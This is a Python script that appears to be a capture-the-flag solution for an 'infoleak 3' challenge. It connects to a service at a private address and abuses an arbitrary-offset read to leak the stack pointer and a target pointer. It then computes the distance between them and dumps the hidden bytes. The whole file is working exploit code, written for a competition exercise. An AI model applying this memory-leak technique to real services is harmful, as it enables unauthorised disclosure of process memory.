#!/usr/bin/env python3
"""
infoleak 3 solution

Offset: 0
0xc
Offset: 1
0xd6
Offset: 2
0xff
Offset: 3
0xff

These 4 bytes gives you esp again

Offset: 8
0x8
Offset: 9
0x80
Offset: a
0x55
Offset: b
0x56

These 4 bytes gives you what we want again

do the math, then we win

I have to do it automated. No problem.
"""
import time
import socket
import binascii
HOST, PORT = '172.31.1.38', 1614

lets_go = 0

for lets_go in range(0, 0x30, 4):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, PORT))

	d = s.recv(1024)
	print(d)
	if b'Offset:' not in d: print(s.recv(1024))

	def getQuad(s, offset):
		s.send(('%x\n' % offset).encode('ascii'))
		time.sleep(0.1)
		w = s.recv(1024)
		print(w)
		s.send(('%x\n' % (offset+1)).encode('ascii'))
		time.sleep(0.1)
		x = s.recv(1024)
		print(x)
		s.send(('%x\n' % (offset+2)).encode('ascii'))
		time.sleep(0.1)
		y = s.recv(1024)
		print(y)
		s.send(('%x\n' % (offset+3)).encode('ascii'))
		time.sleep(0.1)
		z = s.recv(1024)
		print(z)
		q = [t.replace(b'Offset: ', b'').replace(b'\n',b'') for t in [w,x,y,z]]
		q2 = b''.join(q)
		print(q2)
		q = q2.split(b'0x')[1:]
		print(q)
		if b'' in q or len(q) == 3:
			z2 = s.recv(1024)
			if b'' in q: q.remove(b'')
			q.append(z2.replace(b'Offset: ', b'').replace(b'\n',b'').replace(b'0x', b''))
		#end if
		if len(q) != 4:
			print("Error:", q, q2)
			return None
		#end if
		return (int(q[0], 16)) | (int(q[1], 16)<<8) | (int(q[2], 16)<<16) | (int(q[3], 16)<<24)
	#end def getQuad(offset)

	esp = getQuad(s, 0)
	ppp = getQuad(s, 8)

	v = (0x100000000+ppp-esp)
	first_bytes = getQuad(s, v+lets_go)
	print('solution', lets_go, binascii.unhexlify(hex(first_bytes)[2:].rjust(8,'0'))[::-1])

